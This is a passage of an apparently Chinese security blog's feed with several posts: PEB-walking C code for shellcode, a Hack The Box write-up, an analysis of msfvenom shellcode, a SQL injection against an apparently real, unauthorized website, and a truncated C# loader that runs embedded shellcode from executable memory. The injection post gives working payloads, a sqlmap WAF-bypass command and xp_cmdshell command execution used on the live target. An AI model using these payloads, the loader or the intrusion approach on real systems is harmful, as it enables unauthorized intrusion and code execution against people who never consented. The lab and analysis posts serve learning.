;EAX=Third(Kernel32)</code></pre><p><img src="https://s3.ax1x.com/2021/02/22/yHr9Yt.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/22/yHrZwj.png" alt=""></p><p>如何用C实现？<br>1.直接用汇编返回对PEB地址然后根据微软给的数据结构解析即可<br>2.直接用给出的数据结构来解析 （好像可以这么写）</p><p>第一种方法</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main(){    DWORD PPEB;    DWORD LLDR;    DWORD dllbase;    DWORD initlist;    DWORD virtualaddress;    PCHAR dllname;    char *kernel32dllname = &quot;KERNEL32.dll&quot;;    PIMAGE_DOS_HEADER dosheader;    PIMAGE_NT_HEADERS ntheader;    PIMAGE_EXPORT_DIRECTORY exportdirectory;    __asm {        mov eax, fs:[0x30];EAX = PEB        mov PPEB,eax    }    LLDR = *(PDWORD)(PPEB + 0xc); //LDR    printf(&quot;PEB Address:0x%x\n&quot;, PPEB);    initlist=*(PDWORD)(LLDR+0x1c); //LDR-&gt;InInitializationOrderModuleList    CHAR szGetProcAddr[]=&quot;GetProcAddress&quot;;    CHAR szLoadLib[]=&quot;LoadLibraryA&quot;;    for (;dllbase = *(PDWORD)(initlist + 0x8);initlist = *(PDWORD)initlist) { //遍历InMemoryOrderLinks链表        dosheader = (PIMAGE_DOS_HEADER)dllbase; //DOS头部        ntheader = (PIMAGE_NT_HEADERS)(dllbase+dosheader-&gt;e_lfanew); //PE头部        virtualaddress = ntheader-&gt;OptionalHeader.DataDirectory[0].VirtualAddress; //EXPORT_DIRECTORY        exportdirectory = (PIMAGE_EXPORT_DIRECTORY)(dllbase + virtualaddress); //导出表        dllname = (PCHAR)(dllbase + exportdirectory-&gt;Name); //DLL Name        if (!strcmp(dllname, kernel32dllname)) {            printf(&quot;%s Address:0x%x\n&quot;, kernel32dllname, dllbase);        }    }    system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s3.ax1x.com/2021/02/22/yHrsne.png" alt=""></p><p>之后就是从kernel32.dll的PE里导出loadlibraryA和GetProcAddress函数的地址。<br>（下次在写）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jb51.net/article/171962.htm" target="_blank" rel="noopener">https://www.jb51.net/article/171962.htm</a><br><a href="https://zhuanlan.zhihu.com/p/109079902" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/109079902</a><br><a href="https://www.cnblogs.com/lsgxeva/p/10794735.html" target="_blank" rel="noopener">https://www.cnblogs.com/lsgxeva/p/10794735.html</a><br><a href="https://xz.aliyun.com/t/2108" target="_blank" rel="noopener">https://xz.aliyun.com/t/2108</a><br><a href="https://zh.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%9D%97" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%9D%97</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;纯属是之前乱弄shellcode编写的时候看见的PEB，然后当时做了笔记。不是很熟悉PEB这个，打算在了解一下。&lt;/p&gt;
&lt;h2 id=&quot;P</summary>
      
    
    
    
    
    <category term="windows" scheme="http://422926799.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Hack the box Academy</title>
    <link href="http://422926799.github.io/posts/ae09ddc5.html"/>
    <id>http://422926799.github.io/posts/ae09ddc5.html</id>
    <published>2021-02-19T17:10:30.000Z</published>
    <updated>2021-02-19T17:41:55.809Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>没事干和队友打htb</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap</p><pre><code>portscan:22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>whatweb获取web信息的时候发现跳转到<code>http://academy.htb/</code>的域失败了，/etc/hosts加了上去</p><pre><code>http://academy.htb/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.215], Title[Hack The Box Academy]</code></pre><p>常规的路径扫描<br><img src="https://s3.ax1x.com/2021/02/20/y4N0nU.png" alt=""></p><h2 id="入口点立足"><a href="#入口点立足" class="headerlink" title="入口点立足"></a>入口点立足</h2><p>打开web发现可以注册和登录，注册可以注册admin用户<br><img src="https://s3.ax1x.com/2021/02/20/y4NBBF.png" alt=""></p><p>到后台登录队友说是弱口令登录，but我就是tm不行。后面找其要来cookie登上，发现提示<code>dev-staging-01.academy.htb</code>,添加到hosts<br>访问发现是laravel<br><img src="https://s3.ax1x.com/2021/02/20/y4NsAJ.png" alt=""></p><p>由于开启了debug，得到API_KEY<br><img src="https://s3.ax1x.com/2021/02/20/y4N21x.png" alt=""></p><p>搜索laravel RCE发现一个CVE-2018-15133<br>exp：<a href="https://github.com/aljavier/exploit_laravel_cve-2018-15133" target="_blank" rel="noopener">https://github.com/aljavier/exploit_laravel_cve-2018-15133</a><br>利用该CVE获得shell<br><img src="https://s3.ax1x.com/2021/02/20/y4N5He.png" alt=""></p><h2 id="获取用户权限"><a href="#获取用户权限" class="headerlink" title="获取用户权限"></a>获取用户权限</h2><p><code>ls -al /home/*</code>确定要攻击的目标用户<br>（带有user.txt的才是最终用户）<br><img src="https://s3.ax1x.com/2021/02/20/y4USEQ.png" alt=""></p><p>在web目录瞎翻，翻到两个数据库凭证<br><img src="https://s3.ax1x.com/2021/02/20/y4NoAH.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/20/y4Nju8.png" alt=""></p><p>手机/home/目录下的用户，使用hydra爆破得到用户<br><img src="https://s3.ax1x.com/2021/02/20/y4UPCn.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>拿完user.txt后，经过一个小时后使用linPEAss脚本进行信息收集，发现有个su的用户提权的密码<br><img src="https://s3.ax1x.com/2021/02/20/y4Ui3q.png" alt=""></p><p>登录后尝试sudo -l发现拥有sudo权限<br><img src="https://s3.ax1x.com/2021/02/20/y4UEuT.png" alt=""></p><p>GTFObins搜索到对应的提权方法<br><a href="https://gtfobins.github.io/gtfobins/composer/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/composer/</a></p><p>提权成功<br><img src="https://s3.ax1x.com/2021/02/20/y4UZbF.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;没事干和队友打htb&lt;/p&gt;
&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="htb" scheme="http://422926799.github.io/tags/htb/"/>
    
  </entry>
  
  <entry>
    <title>msfvenom生成的windows/exec shellcode分析</title>
    <link href="http://422926799.github.io/posts/c86ff70d.html"/>
    <id>http://422926799.github.io/posts/c86ff70d.html</id>
    <published>2021-02-19T04:40:56.000Z</published>
    <updated>2021-02-19T08:46:52.911Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于之前就想分析msfvenom生成的payload。经过前后几次波折<br>第三次分析后才看懂了不少。</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>1.msfvenom生成shellcode<br>ps:用x86更好的分析</p><pre><code>msfvenom -p windows/exec cmd=calc.exe -f raw -o shellcode.bin</code></pre><p>2.将shellcode放入一个PE里<br>准备工具:</p><ul><li>yasm.exe</li><li>GoLink.exe<br><img src="https://s3.ax1x.com/2021/02/19/yfWvJf.png" alt=""></li></ul><p>将shellcdoe.bin和shellcode.asm放在同一个目录<br>shellcode.asm</p><pre><code class="asm">Global StartSECTION &#39;foo&#39; write,execute,readStart:incbin &quot;shellcode.bin&quot;</code></pre><p>生成obj后在生成exe</p><pre><code>yasm.win32.exe -f win32 -o shell.obj shellcode.asmGolink /ni /entry Start shell.obj</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yffFwn.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/19/yffkoq.png" alt=""></p><p>3.利用IDA分析<br><img src="https://s3.ax1x.com/2021/02/19/yffZWT.png" alt=""></p><p>loc_401088函数分析</p><p>msf生成payload的模板对照分析<br><img src="https://s3.ax1x.com/2021/02/19/yff8Fx.png" alt=""><br>提一点:msf生成的shellcode模板对应的API是<code>hash( &quot;kernel32.dll&quot;, &quot;GetVersion&quot; )</code><br>计算公式：</p><pre><code class="text">msf的windows API方法：DLL HASH+API HASH=HASH如果知道最终hash求对应的API名称，计算公式：HASH-DLL HASH=API HASH例如：kernel32.dll HASH-&gt;92AF16DAWinexec HASH-&gt;F4C07457x86截取最后8位最终hash位：92AF16DA+F4C07457=876F8B31得到hash反求API hash：876F8B31-92AF16DA=F4C07457对应API和DLL 的HASH参考:https://github.com/hidd3ncod3s/WindowsAPIhash</code></pre><p><a href="https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803</a></p><pre><code class="ruby">  def self.win32_rwx_exec_thread(code, block_offset, which_offset=&#39;start&#39;)    stub_block = Rex::Payloads::Shuffle.from_graphml_file(      File.join(Msf::Config.install_root, &#39;data&#39;, &#39;shellcode&#39;, &#39;block_api.x86.graphml&#39;),      arch: ARCH_X86,      name: &#39;api_call&#39;    )    stub_exit = %Q^    ; Input: EBP must be the address of &#39;api_call&#39;.    ; Output: None.    ; Clobbers: EAX, EBX, (ESP will also be modified)    ; Note: Execution is not expected to (successfully) continue past this block    exitfunk:      mov ebx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...      push 0x9DBD95A6        ; hash( &quot;kernel32.dll&quot;, &quot;GetVersion&quot; )      call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)      cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7      jl goodbye       ; Then just call the exit function...      cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...      jne goodbye      ;      mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread    goodbye:                 ; We now perform the actual call to the exit function      push byte 0            ; push the exit function parameter      push ebx               ; push the hash of the exit function      call ebp               ; call EXITFUNK( 0 );    ^    stub_alloc = %Q^      pushad                 ; Save registers      cld                    ; Clear the direction flag.      call start             ; Call start, this pushes the address of &#39;api_call&#39; onto the stack.    delta:                   ;    #{stub_block}    start:                   ;      pop ebp                ; Pop off the address of &#39;api_call&#39; for calling later.    allocate_size:       mov esi,#{code.length}    allocate:      push byte 0x40         ; PAGE_EXECUTE_READWRITE      push 0x1000            ; MEM_COMMIT      push esi               ; Push the length value of the wrapped code block      push byte 0            ; NULL as we dont care where the allocation is.      push 0xE553A458        ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAlloc&quot; )      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );      mov ebx, eax           ; Store allocated address in ebx      mov edi, eax           ; Prepare EDI with the new address      mov ecx, esi           ; Prepare ECX with the length of the code      call get_payload    got_payload:      pop esi                ; Prepare ESI with the source to copy      rep movsb              ; Copy the payload to RWX memory      call set_handler       ; Configure error handling    exitblock:    #{stub_exit}    set_handler:      xor eax,eax;     push dword [fs:eax];     mov dword [fs:eax], esp      push eax               ; LPDWORD lpThreadId (NULL)      push eax               ; DWORD dwCreationFlags (0)      push eax               ; LPVOID lpParameter (NULL)      push ebx               ; LPTHREAD_START_ROUTINE lpStartAddress (payload)      push eax               ; SIZE_T dwStackSize (0 for default)      push eax               ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)      push 0x160D6838        ; hash( &quot;kernel32.dll&quot;, &quot;CreateThread&quot; )      call ebp               ; Spawn payload thread      pop eax                ; Skip;     pop eax                ; Skip      pop eax                ; Skip      popad                  ; Get our registers back;     sub esp, 44            ; Move stack pointer back past the handler    ^    stub_final = %Q^    get_payload:      call got_payload    payload:    ; Append an arbitrary payload here    ^    stub_alloc.gsub!(&#39;short&#39;, &#39;&#39;)    stub_alloc.gsub!(&#39;byte&#39;, &#39;&#39;)    wrapper = &quot;&quot;    # regs    = %W{eax ebx ecx edx esi edi ebp}    cnt_jmp = 0    cnt_nop = 64    stub_alloc.each_line do |line|      line.gsub!(/;.*/, &#39;&#39;)      line.strip!      next if line.empty?      if cnt_nop &gt; 0 &amp;&amp; rand(4) == 0        wrapper &lt;&lt; &quot;nop\n&quot;        cnt_nop -= 1      end      if cnt_nop &gt; 0 &amp;&amp; rand(16) == 0        cnt_nop -= 2        cnt_jmp += 1        wrapper &lt;&lt; &quot;jmp autojump#{cnt_jmp}\n&quot;        1.upto(rand(8)+1) do          wrapper &lt;&lt; &quot;db 0x#{&quot;%.2x&quot; % rand(0x100)}\n&quot;          cnt_nop -= 1        end        wrapper &lt;&lt; &quot;autojump#{cnt_jmp}:\n&quot;      end      wrapper &lt;&lt; line + &quot;\n&quot;    end</code></pre><p>start函数对应分析<br><img src="https://s3.ax1x.com/2021/02/19/yffqcF.png" alt=""></p><p>由于静态call ebp这种找不到对应的地址，通过od来跟踪到loc_401088函数里的<code>call ebp</code><br>1.首先栈顶最上放出栈到ebp<br>2.然后push 1<br>3.在从堆栈里把calc.exe赋予到eax -&gt; lea eax,[ebp+0B2h]<br><img src="https://s3.ax1x.com/2021/02/19/yfhX28.png" alt=""><br>4.push eax，将calc.exe写入到堆栈<br>5.push Winexec对应的函数<br>6.然后call栈顶<br><img src="https://s3.ax1x.com/2021/02/19/yfhYEn.png" alt=""></p><p>地址跳转到00401006地址<br><img src="https://s3.ax1x.com/2021/02/19/yfI5KU.png" alt=""></p><p>PEB-&gt;Ldr-&gt;</p><pre><code> mov     edx, fs:[eax+30h] ; 寻找PEB地址foo:0040100F                 mov     edx, [edx+0Ch]  ; PEB_LDR_DATAfoo:00401012                 mov     edx, [edx+14h]  ; ModuleEntryPointfoo:00401015foo:00401015 loc_401015:                             ; CODE XREF: start+86↓jfoo:00401015                 mov     esi, [edx+28h]  ; 遍历获取某些值的区段foo:00401018                 movzx   ecx, word ptr [edx+26h] xor     edi, edi        ; 清空EDI寄存器 lodsb                   ; 将SI的存储值赋予ALfoo:0040101E                                         ; mov eax,[esi]foo:0040101E                                         ; df=1;SI+1 else SI-1</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yf78DU.png" alt=""></p><p>寻找对应API的函数</p><pre><code>0040101E   &gt; /AC            lods byte ptr ds:[esi]0040101F   . |3C 61         cmp al,0x6100401021   . |7C 02         jl short shell.0040102500401023   . |2C 20         sub al,0x2000401025   &gt; |C1CF 0D       ror edi,0xD00401028   . |01C7          add edi,eax0040102A   .^\E2 F2         loopd short shell.0040101E0040102C   .  52            push edx0040102D   .  57            push edi0040102E   .  8B52 10       mov edx,dword ptr ds:[edx+0x10]          ;  shell.0040000000401031   .  8B4A 3C       mov ecx,dword ptr ds:[edx+0x3C]00401034   .  8B4C11 78     mov ecx,dword ptr ds:[ecx+edx+0x78]00401038   .  E3 48         jecxz short shell.004010820040103A   .  01D1          add ecx,edx0040103C   .  51            push ecx0040103D   .  8B59 20       mov ebx,dword ptr ds:[ecx+0x20]00401040   .  01D3          add ebx,edx00401042   .  8B49 18       mov ecx,dword ptr ds:[ecx+0x18]00401045   &gt;  E3 3A         jecxz short shell.0040108100401047   .  49            dec ecx00401048   .  8B348B        mov esi,dword ptr ds:[ebx+ecx*4]0040104B   .  01D6          add esi,edx0040104D   .  31FF          xor edi,edi0040104F   &gt;  AC            lods byte ptr ds:[esi]00401050   .  C1CF 0D       ror edi,0xD00401053   .  01C7          add edi,eax00401055   .  38E0          cmp al,ah00401057   .^ 75 F6         jnz short shell.0040104F00401059   .  037D F8       add edi,dword ptr ss:[ebp-0x8]0040105C   .  3B7D 24       cmp edi,dword ptr ss:[ebp+0x24]0040105F   .^ 75 E4         jnz short shell.00401045</code></pre><p>最后得到的API函数地址赋于eax</p><pre><code>00401075   .  894424 24     mov dword ptr ss:[esp+0x24],eax          ;  kernel32.WinExec</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yfbU6x.png" alt=""></p><p>最后jmp eax对应的地址执行<br><img src="https://s3.ax1x.com/2021/02/19/yfbIAg.png" alt=""></p><p>执行完WinExec函数后，执行GetVersion判断退出操作<br><img src="https://s3.ax1x.com/2021/02/19/yhnum6.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/19/yhnY6I.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/19/yhna0f.png" alt=""></p><p>简写成一个过程：<br>PEB-&gt;ModuleEntryPoint-&gt;找到Kernel32.dll-&gt;WinExec-&gt;lea eax-&gt;call-&gt;Exit</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803</a><br><a href="https://www.anquanke.com/post/id/85386" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85386</a><br><a href="http://9b113d1a.blogspot.com/2017/03/les-hash-composite-couplemodulefunction.html" target="_blank" rel="noopener">http://9b113d1a.blogspot.com/2017/03/les-hash-composite-couplemodulefunction.html</a><br><a href="https://my.oschina.net/u/4593082/blog/4418768" target="_blank" rel="noopener">https://my.oschina.net/u/4593082/blog/4418768</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;由于之前就想分析msfvenom生成的payload。经过前后几次波折&lt;br&gt;第三次分析后才看懂了不少。&lt;/p&gt;
&lt;h2 id=&quot;分析过程&quot;</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>一次糟糕的mssql注入尝试</title>
    <link href="http://422926799.github.io/posts/976028d5.html"/>
    <id>http://422926799.github.io/posts/976028d5.html</id>
    <published>2021-02-13T13:51:15.000Z</published>
    <updated>2021-02-13T15:10:47.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="观前提醒"><a href="#观前提醒" class="headerlink" title="观前提醒"></a>观前提醒</h2><p>本文已对实际的人以游戏或番剧人名代替</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>源于昨天一次组团冲塔的时候发现的一个站。原本随便看一下，没注入就换目标。结果呢<br>随手一测还真有个注入。然后开始漫长的摸索…</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>一个熟悉的登录框<br><img src="https://s3.ax1x.com/2021/02/13/ysQszT.png" alt=""></p><p>哎，反手一个引号。<code>sql server Error</code><br><img src="https://s3.ax1x.com/2021/02/13/ysQReJ.png" alt=""></p><p>sqlmap扔进去？没跑出来，经过测试，得到sqlmap command绕过 WAF （空气waf就像3090一样根本不存在）</p><pre><code>sudo proxychains sqlmap -r post.txt --tamper=space2randomblank.py,equaltolike.py -v 3</code></pre><p>盲注，慢的一批<br><img src="https://s3.ax1x.com/2021/02/13/ysQbOe.png" alt=""></p><p>就在逐个跑表的时候，一名A哥已经手注了。这时我赶紧白嫖了A哥的payload</p><pre><code>id=1&#39; and 1&lt;(select @@version) --&amp;password=11111</code></pre><p>报错注入bingo<br><img src="https://s3.ax1x.com/2021/02/13/yslulT.png" alt=""></p><p>获取所有表名或子段名/某指定表名</p><pre><code>id=admin&#39; and 1&lt;(select QUOTENAME(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG=DB_NAME()  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasdid=admin&#39; and 1&lt;(select QUOTENAME(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=&#39;wwwlog&#39;  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasdid=admin&#39; and 1&lt;(select QUOTENAME(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_CATALOG=DB_NAME()  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasdid=admin&#39; and 1&lt;(select QUOTENAME(UNAME) from master dbo.wwwlog FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasd</code></pre><p>后发现sqlmap跑出来的数据和查出来的差一大截，索性不用sqlmap<br><img src="https://s3.ax1x.com/2021/02/13/yslq3V.png" alt=""></p><p>后面测试多段注入使用cmd_shell尝试能否使用的时候，发现并未成功（后面发现的原因是master..xp_cmdshell不行，直接xp_cmdshell就可以？？？？）<br><img src="https://s3.ax1x.com/2021/02/13/ys1zM8.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/13/ys3NLD.png" alt=""></p><p>思考半天后不知如何实现回显RCE，后搜到一篇文章如醍醐灌顶。<br>创建表，把执行结果插入到表里然后读取即可</p><pre><code>id=admin&#39; CREATE TABLE tmpx (tmp1 varchar(max),tmp2 varchar(max))--&amp;password=11id=admin&#39; insert into tmpx (tmp1) exec xp_cmdshell &#39;whoami&#39;--&amp;password=11id=admin&#39; and 1&lt;(select QUOTENAME(tmp1) from tmpx FOR XML PATH(&#39;&#39;)) --&amp;password=11id=admin&#39; drop table tmpx --&amp;password=11</code></pre><p><img src="https://s3.ax1x.com/2021/02/13/ys3NLD.png" alt=""></p><p>为了方便执行命令，写了个py<br><img src="https://s3.ax1x.com/2021/02/13/ysG8KK.png" alt=""></p><p>然后遇见的几个坑<br>1.type读文件不行<br>2.sql server的表存储内容大小有限，超过会被截断</p><p>解决方法统一用powershell来代替<br>读取进程</p><pre><code>powershell &quot;tasklist /svc | Select -First 35&quot; #读取到35行powershell &quot;$data=tasklist /svc;$data[36..60]&quot; #从36行读到60行</code></pre><p>用上面的第二条命令逐行读取直到读完全部<br><img src="https://s3.ax1x.com/2021/02/13/ysJmsf.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/13/ysJQoQ.png" alt=""></p><p>powershell代替type命令读取文件</p><pre><code>powershell &quot;get-content C:\Windows\System32\drivers\etc\hosts&quot;powershell &quot;get-content C:\Windows\System32\drivers\etc\hosts | Select -First 10&quot;</code></pre><p><img src="https://s3.ax1x.com/2021/02/13/ysJIfA.png" alt=""></p><p>尝试上线提权发现，shell连几秒后马上断开。最后确定是IDS的问题，现在卡在这个地方…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;观前提醒&quot;&gt;&lt;a href=&quot;#观前提醒&quot; class=&quot;headerlink&quot; title=&quot;观前提醒&quot;&gt;&lt;/a&gt;观前提醒&lt;/h2&gt;&lt;p&gt;本文已对实际的人以游戏或番剧人名代替&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="渗透" scheme="http://422926799.github.io/tags/渗透/"/>
    
  </entry>
  
  <entry>
    <title>powershell Assembly Load的使用</title>
    <link href="http://422926799.github.io/posts/7318adbf.html"/>
    <id>http://422926799.github.io/posts/7318adbf.html</id>
    <published>2021-01-31T19:19:38.000Z</published>
    <updated>2021-01-31T19:35:28.044Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>分析昨天的vbs的时候看见了个为<code>[Reflection.Assembly]::Load</code>的技术。好像没研究过<br>就拿来研究一下。</p><p>简要说明：利用powershell进行C#里的函数调用</p><p>参考链接：<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</a></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>注意实现，被调用的类名和函数名。须为public。且为静态(static)<br>test.cs</p><pre><code class="c#">using System;using System.Runtime.InteropServices;namespace run{    public class Program    {        public static void box() {            byte[] shellcode = new byte[304]{                                    0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x53, 0x8D, 0x45, 0xEC, 0xC7, 0x45, 0xEC, 0x75, 0x73, 0x65,                                    0x72, 0x33, 0xDB, 0xC7, 0x45, 0xF0, 0x33, 0x32, 0x2E, 0x64, 0x50, 0xB9, 0x4C, 0x77, 0x26, 0x07,                                    0x66, 0xC7, 0x45, 0xF4, 0x6C, 0x6C, 0x88, 0x5D, 0xF6, 0xC7, 0x45, 0xF8, 0x74, 0x6F, 0x70, 0x73,                                    0x66, 0xC7, 0x45, 0xFC, 0x65, 0x63, 0x88, 0x5D, 0xFE, 0xE8, 0x1A, 0x00, 0x00, 0x00, 0xFF, 0xD0,                                    0x53, 0x8D, 0x45, 0xF8, 0xB9, 0x45, 0x83, 0x56, 0x07, 0x50, 0x50, 0x53, 0xE8, 0x07, 0x00, 0x00,                                    0x00, 0xFF, 0xD0, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0x83, 0xEC, 0x10, 0x64, 0xA1, 0x30, 0x00, 0x00,                                    0x00, 0x53, 0x55, 0x56, 0x8B, 0x40, 0x0C, 0x57, 0x89, 0x4C, 0x24, 0x18, 0x8B, 0x70, 0x0C, 0xE9,                                    0x8A, 0x00, 0x00, 0x00, 0x8B, 0x46, 0x30, 0x33, 0xC9, 0x8B, 0x5E, 0x2C, 0x8B, 0x36, 0x89, 0x44,                                    0x24, 0x14, 0x8B, 0x42, 0x3C, 0x8B, 0x6C, 0x10, 0x78, 0x89, 0x6C, 0x24, 0x10, 0x85, 0xED, 0x74,                                    0x6D, 0xC1, 0xEB, 0x10, 0x33, 0xFF, 0x85, 0xDB, 0x74, 0x1F, 0x8B, 0x6C, 0x24, 0x14, 0x8A, 0x04,                                    0x2F, 0xC1, 0xC9, 0x0D, 0x3C, 0x61, 0x0F, 0xBE, 0xC0, 0x7C, 0x03, 0x83, 0xC1, 0xE0, 0x03, 0xC8,                                    0x47, 0x3B, 0xFB, 0x72, 0xE9, 0x8B, 0x6C, 0x24, 0x10, 0x8B, 0x44, 0x2A, 0x20, 0x33, 0xDB, 0x8B,                                    0x7C, 0x2A, 0x18, 0x03, 0xC2, 0x89, 0x7C, 0x24, 0x14, 0x85, 0xFF, 0x74, 0x31, 0x8B, 0x28, 0x33,                                    0xFF, 0x03, 0xEA, 0x83, 0xC0, 0x04, 0x89, 0x44, 0x24, 0x1C, 0x0F, 0xBE, 0x45, 0x00, 0xC1, 0xCF,                                    0x0D, 0x03, 0xF8, 0x45, 0x80, 0x7D, 0xFF, 0x00, 0x75, 0xF0, 0x8D, 0x04, 0x0F, 0x3B, 0x44, 0x24,                                    0x18, 0x74, 0x20, 0x8B, 0x44, 0x24, 0x1C, 0x43, 0x3B, 0x5C, 0x24, 0x14, 0x72, 0xCF, 0x8B, 0x56,                                    0x18, 0x85, 0xD2, 0x0F, 0x85, 0x6B, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x5F, 0x5E, 0x5D, 0x5B, 0x83,                                    0xC4, 0x10, 0xC3, 0x8B, 0x74, 0x24, 0x10, 0x8B, 0x44, 0x16, 0x24, 0x8D, 0x04, 0x58, 0x0F, 0xB7,                                    0x0C, 0x10, 0x8B, 0x44, 0x16, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x10, 0x03, 0xC2, 0xEB, 0xDB                                };            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);            IntPtr hThread = IntPtr.Zero;            UInt32 threadId = 0;            // prepare data            IntPtr pinfo = IntPtr.Zero;            // execute native code            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);            WaitForSingleObject(hThread, 0xFFFFFFFF);        }        static void Main(string[] args)        {            // native function’s compiled code            // generated with metasploit        }        private static UInt32 MEM_COMMIT = 0x1000;        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);        [DllImport(&quot;kernel32&quot;)]        private static extern bool VirtualFree(IntPtr lpAddress,        UInt32 dwSize, UInt32 dwFreeType);        [DllImport(&quot;kernel32&quot;)]        private static extern 